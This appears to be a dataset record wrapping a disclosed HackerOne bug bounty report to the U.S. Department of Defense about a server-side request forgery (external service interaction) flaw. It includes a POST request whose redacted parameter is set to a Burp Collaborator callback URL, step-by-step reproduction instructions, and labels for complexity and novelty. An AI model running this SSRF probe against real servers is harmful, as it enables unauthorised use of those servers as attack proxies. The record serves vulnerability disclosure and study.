@@ -1,0 +1,46 @@
+{
+    "reported_to": "U.S. Dept Of Defense",
+    "reported_by": "fiveguyslover ",
+    "title": "External Service Interaction (HTTP/DNS) on https://www.\u2588\u2588\u2588  (\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 parameter)",
+    "content": "\nGreetings, i've find a External service interaction (HTTP/DNS) on https://www.\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nCode 1.43 KiB\n1External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, \n2such as a web or mail server. \n3The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, \n4and in some cases might even be the intended behavior of the application. \n5However, in many cases, it can indicate a vulnerability with serious consequences.\n6\n7In cases where DNS-based interactions can be triggered, it is normally possible to trigger interactions using other service types, \n8and these are reported as separate issues.\n9 If a payload that specifies a particular service type (e.g. a URL) triggers only a DNS-based interaction, \n10then this strongly indicates that the application attempted to connect using that other service, \n11but was prevented from doing so by egress filters in place at the network layer. \n12The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. \n13By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. \n14This may include public third-party systems, internal systems within the same organization, \n15or services available on the local loopback adapter of the application server itself. Depending on the network architecture, \n16this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.\nhttps://portswigger.net/kb/issues/00300200_external-service-interaction-dns\nFull link : https://www.\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\nPOST Request :\nCode 377 Bytes\n1\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588&MONTH=01&LNAME=frenchvlad&PHONE=555-555-0199&EDULVL=10&STATE=AL&EMAILFLAG=on&submitButton=Submit+Audition+Request&EMAIL=frenchvlad@example.com&ADD1=555-555-0199@frenchvlad.com&\u2588\u2588\u2588\u2588\u2588\u2588=http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville&ADD2=555-555-0199@frenchvlad.com&INST1MOS=Bass+Guitar&CITY=Winterville&YEAR=2003&INST1YRS=2+TO+5&DAY=01&CITIZEN=R\nmy payload : \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588=http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville\nProof (DNS) :\n\u2588\u2588\u2588\u2588\u2588\u2588\nProof (HTTP) :\n\u2588\u2588\u2588\u2588\u2588\nbest regards,\nfrenchvlad\nImpact\nWe can use the weakness as a attack proxy to DDOS all Internal/external web conatiners, also could be amplified too\n\n",
+    "severity": [
+        7.0,
+        8.9
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "Server-Side Request Forgery (SSRF)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1617403440,
+    "report_url": "https://hackerone.com/reports/997376",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Identify a parameter in the web application that accepts URLs or external service references (in this case, the '\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588' parameter)."
+        ],
+        [
+            2,
+            "Replace the parameter value with a Burp Collaborator URL (e.g., 'http://bcrxn9tx1eboqdat33ghligdv41upj.burpcollaborator.net/?Winterville')."
+        ],
+        [
+            3,
+            "Submit the modified request (POST request in this case) and monitor the Burp Collaborator for DNS/HTTP interactions."
+        ],
+        [
+            4,
+            "Confirm the vulnerability by observing DNS/HTTP callbacks in the Burp Collaborator logs."
+        ]
+    ],
+    "vuln_description": "The vulnerability allows an attacker to induce the application to interact with arbitrary external services (HTTP/DNS). This can be exploited to use the server as an attack proxy, potentially leading to internal/external service attacks (e.g., DDoS).",
+    "reason": "The attack involves a straightforward parameter manipulation to trigger external interactions. No complex application states, novel logic, or subtle interactions are required. The primary challenge is identifying the vulnerable parameter, which is a common testing step.",
+    "new_complexity": "LOW",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null
+}
